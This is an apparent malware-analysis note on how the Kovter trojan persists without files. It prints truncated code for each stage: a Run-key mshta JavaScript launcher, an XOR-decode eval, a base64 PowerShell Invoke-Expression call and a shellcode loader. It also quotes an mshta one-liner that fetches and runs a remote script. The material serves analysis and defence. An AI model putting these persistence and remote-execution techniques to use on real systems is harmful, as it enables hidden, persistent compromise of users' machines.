# Achieving Fileless Persistence - Kovter (Trojan Horse Malware)

## Stage 1

`HKCU\Software\Microsoft\Windows\CurrentVersion\Run` : key with random alphabetic name is run. This registry key is configured to run some code or executable every time the user logs into the system.

```
mshta.exe javascript:b9QcTEt1="9rRRNbh"; xo6=new%20ActiveXObject("WScript.Shell"); ktsX6jm8="XjCrDk"; A8hi8f=x06.RegRead("HKCU\\\\software\\\\enjsdadnj\\\\iddac"); qli9u7="ke5WS9";eval(A8hi8f);v7M51z="2X";
```

## Stage 2

Large hexstring is xor decoded and passed to a second javascript eval function. Meaningless javascript variables are created and intermixed with the XOR decode algorithm (for obfuscation purposes).

```
ep7n="7C63240F042A3B0F3A662A141596A5..133451D56"; for(H=y=0; y<r.length; y++) { y+=String.fromCharCode(r.substr(y,1).charCodeAt()^i.substr(H,1.charCodeAt()); } eval(y)
```

## Stage 3

Base64 string is decoded and passed as environment to Powershell, which calls invoke expression on it (allowing execution of dynamically generated code).

```
z3s2=new ActiveXObject("WScript.Shell"); (z3s2.Environment("Process"))("xmbvebj")="iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('I21mZ2p5ZnANCn.')))"; FF7q6M=z3s2.Run("cmd.exe /c \"C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe\" Invoke-Expression $env:xmbvebj",0,0);}catch(e){}close();
```

## Stage 4

Two functions are defined, gdelegate and gproc. These resolve `VirtualAlloc` allocated a Read-Write-Execute (RWX) buffer (often used for executing injected shellcode), and copy a byte array called `SC32` into it. `CreateThread` passes control to the buffer, effectively executing the code contained within it.

```
[Byte[]] $sc32 = 0x55,0x8B,<#gr#>0xEC,0x81,...; for ($i=0; $i -le ($sc32.Length-1);$i++) [System.Runtime.InteropServices.Marshall]::GetDelegateForFunctionPointer((gproc kernel32.dll CreateThread), (gdelegate @([IntPtr],[UInt32],[UInt32],[UInt32],[UInt32],[IntPtr]) ([IntPtr]))).Invoke(0,0,$pr,$pr,0,0);
```

## Stage 5

`Shellcode32` reads RegValue("7") with Windows API function `RegQueryValueEx`. This buffer is decoded with an XOR key. The decoded buffer is loaded into memory using the modified Kovter PE loaders, which allocates a buffer twice `SizeOfImage` in the PE header. This process is used to inject/load Kovter's malicious code into the system's memory. After the loaded version of Kovter, it copies the unloaded PE - this enables Kovter to reflectively load itself in the future. The context string is copied after this in memory. Execution passes to the entry point of the Kovter DLL, effectively initiating the malicious actions and behaviour associate with Kovter.

### mshta.exe

**Used by Windows to execute html applications. (.hta)**

`mshta.exe javascript:a=GetObject("script:https://webserver/payload.sct").Exec();close();`

Description: Executes JavaScript supplied as a command line argument.
Usecase: Execute code
Privileges required: User
OS: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11

[SOURCE](https://lolbas-project.github.io/lolbas/Binaries/Mshta/)

### NTUSER.DAT

![NTUSER.dat](../static/ntuser.png)


**regipy**
Python library for parsing offline registry hives

`pip install regipy`

**Resources**
[How to view HKCU Registry Key of another user as admin in powershell](https://stackoverflow.com/questions/71334237/how-to-read-hkcu-registry-key-of-another-user-in-admin-on-powershell)
[Do not know the user's password so cannot login as them and do "run as"](https://superuser.com/questions/46399/access-another-users-hkey-current-user-registry-branch)

[Credit](https://www.youtube.com/watch?v=DXlqAH1IV6A&ab_channel=JohnHammond)